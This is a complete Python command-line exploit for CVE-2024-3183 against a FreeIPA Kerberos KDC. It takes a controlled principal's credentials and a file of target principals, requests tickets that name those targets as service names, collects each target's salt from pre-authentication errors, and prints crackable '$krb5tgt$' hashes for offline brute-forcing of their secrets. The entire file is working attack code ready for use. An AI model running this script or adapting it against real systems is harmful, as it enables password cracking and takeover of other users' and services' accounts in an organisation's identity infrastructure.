#!/usr/bin/env python

import logging
import argparse
import sys
import secrets
from ipapocket.utils import logger
from ipapocket.exceptions.exceptions import UnexpectedKerberosError
from ipapocket.krb5.types import *
from ipapocket.krb5.constants import *
from ipapocket.krb5.operations import BaseKrb5Operations
from ipapocket.network.krb5 import Krb5Client
from ipapocket.krb5.crypto import crypto
from ipapocket.krb5.crypto.backend import Key, _get_etype_profile
from binascii import hexlify


class Storage:
    _etype: EncryptionTypes = None
    _salt: str = None
    _cipher: str = None

    def __init__(self, etype=None, salt=None):
        self.etype = etype
        self.salt = salt

    @property
    def etype(self) -> EncryptionTypes:
        return self._etype

    @etype.setter
    def etype(self, value) -> None:
        self._etype = value

    @property
    def salt(self) -> str:
        return self._salt

    @salt.setter
    def salt(self, value) -> None:
        self._salt = value

    @property
    def cipher(self) -> str:
        return self._cipher

    @cipher.setter
    def cipher(self, value) -> None:
        self._cipher = value


class Cve_2024_3183:
    _base: BaseKrb5Operations = None
    _username: str = None
    _password: str = None
    _domain: str = None
    _ipa_host: str = None
    _target_principals: list[str] = None
    _storage: dict[str, Storage] = None
    _krb5client: Krb5Client = None
    _key: Key = None

    def __init__(self, username, password, domain, ipa_host, principals):
        self._base = BaseKrb5Operations(username=username, domain=domain)
        self._username = username
        self._password = password
        self._domain = domain
        self._ipa_host = ipa_host
        self._target_principals = principals
        self._storage = dict[str, Storage]()
        self._krb5client = Krb5Client(ipa_host)
        self._base_custom = BaseKrb5Operations(domain=domain)

    def get_salts(self):
        logging.info("get etype and salt for target principals...")
        for v in self._storage.copy().keys():
            logging.debug("get etype and salt for principal {}".format(v))
            response = KerberosResponse.load(
                self._krb5client.sendrcv(
                    self._base_custom.as_req_without_pa(
                        username=v,
                        etype=self._storage[v].etype,
                    ).dump(),
                )
            )
            if not response.is_krb_error():
                logging.warn("user {} has no PREAUTH, skipping...".format(v))
                self._storage.pop(v)
                pass
            else:
                error = response.krb_error
                if error.error_code != ErrorCodes.KDC_ERR_PREAUTH_REQUIRED:
                    self._storage.pop(v)
                    logging.debug(
                        "error {} while process request for user {}".format(
                            error.error_code.name, v
                        )
                    )
                else:
                    # extract etype and salt
                    try:
                        self._base_custom.as_req_preffered_etype(error)
                        self._storage[v].salt = self._base_custom.salt
                    except Exception as e:
                        self._storage.pop(v)
                        logging.debug(
                            "unable get preferred etype for user {}: {}".format(v, e)
                        )

    def get_base(self) -> bool:
        logging.info("get etype and salt for controller principal")
        logging.debug(
            "create AS-REQ without PA for controlled user {}".format(self._username)
        )
        response = KerberosResponse.load(
            self._krb5client.sendrcv(
                self._base.as_req_without_pa(
                    username=self._username,
                ).dump()
            )
        )
        if not response.is_krb_error():
            logging.error(
                "controlled principal {} has no PREAUTH, unable process".format(
                    self._username
                )
            )
            return False
        else:
            error = response.krb_error
            if error.error_code != ErrorCodes.KDC_ERR_PREAUTH_REQUIRED:
                logging.error(
                    "unexpected KRB error type {}".format(error.error_code.name)
                )
                return False
            else:
                self._base.as_req_preffered_etype(error)
                self._key = crypto.string_to_key(
                    self._base.etype, self._password, self._base.salt
                )
                return True

    def get_tickets(self):
        logging.info("get tickets using target principals as service names")
        for k in self._target_principals:
            response = KerberosResponse.load(
                self._krb5client.sendrcv(
                    self._base_custom.as_req_with_pa(
                        username=self._username,
                        etype=self._key.enctype,
                        key=self._key,
                        service=k,
                    ).dump(),
                )
            )
            if response.is_krb_error():
                if response.krb_error.error_code == ErrorCodes.KDC_ERR_PREAUTH_FAILED:
                    raise Exception(
                        "invalid credentials supplied for controlled principal {}".format(
                            self._username
                        )
                    )
                else:
                    logging.debug(
                        "unexpected KRB error {} in AS-REQ with service name {}".format(
                            response.krb_error.error_code.name, k
                        )
                    )
            else:
                # save ciphertext of ticket
                self._storage[k] = Storage()
                self._storage[k].cipher = response.as_rep.kdc_rep.ticket.enc_part.cipher
                self._storage[k].etype = response.as_rep.kdc_rep.ticket.enc_part.etype

    def output_hashes(self):
        """
        Hashes in format:
        $krb5tgt$etype$service$salt$checksum$ticket
        """
        logging.info("print hashes")
        for k, v in self._storage.items():
            # get ciphertext and mac
            c, h = _get_etype_profile(v.etype).splitter(v.cipher)
            entry = "$krb5tgt$%d$%s$%s$%s$%s" % (
                v.etype.value,
                k,
                hexlify(v.salt).decode(),
                hexlify(h).decode(),
                hexlify(c).decode(),
            )
            print(entry)

    def exploit(self):
        """
        This realization of CVE-2024-3183 targeting abuse of TGT (not TGS).
        1. We need to get valid TGT response with ticket, encrypted by targeting principal's secret;
        2. We need to get salt for target principal, which hash we want crack;
        3. Combine of salt + encrypted ticket will get possibility for brute-force attach.
        """
        # get etype and salt for controlled principal
        if not self.get_base():
            sys.exit(1)
        # get ticket for all principals in storage
        try:
            self.get_tickets()
        except Exception as e:
            logging.error("{}".format(e))
            sys.exit(1)
        # get etypes and salts for each targeting principal
        self.get_salts()
        # create output hashes for all processed principals
        self.output_hashes()


if __name__ == "__main__":
    logger.init()
    parser = argparse.ArgumentParser(add_help=True, description="CVE-2024-3183")
    parser.add_argument(
        "-u",
        "--username",
        required=True,
        action="store",
        help="Username of controlled principal",
    )
    parser.add_argument(
        "-p",
        "--password",
        required=True,
        action="store",
        help="Password of controlled principal",
    )
    parser.add_argument(
        "-d",
        "--domain",
        required=True,
        action="store",
        help="Domain name, e.g. ipa.test",
    )
    parser.add_argument(
        "-H",
        "--ipa-host",
        required=True,
        action="store",
        help="IP address or FQDN of FreeIPA KDC",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        required=False,
        action="store_true",
        help="Verbose mode",
    )
    parser.add_argument(
        "-t",
        "--targets",
        required=True,
        action="store",
        help="Path to file with target principals",
    )

    options = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if options.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    with open(options.targets, "r") as f:
        principals = f.read().splitlines()

    cve = Cve_2024_3183(
        options.username,
        options.password,
        options.domain,
        options.ipa_host,
        principals,
    )
    try:
        cve.exploit()
    except UnexpectedKerberosError as e:
        print(e)
